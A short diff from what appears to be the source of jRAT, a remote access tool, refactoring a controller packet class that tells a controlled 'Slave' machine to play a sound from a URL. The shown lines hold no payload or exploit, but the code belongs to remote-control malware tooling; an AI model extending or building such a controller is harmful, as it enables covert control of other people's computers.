@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet44PlaySoundFromURL extends AbstractOutgoingPacket {
+public class Packet44PlaySoundFromURL implements OutgoingPacket {
 
 	private String url;
 	private int times;
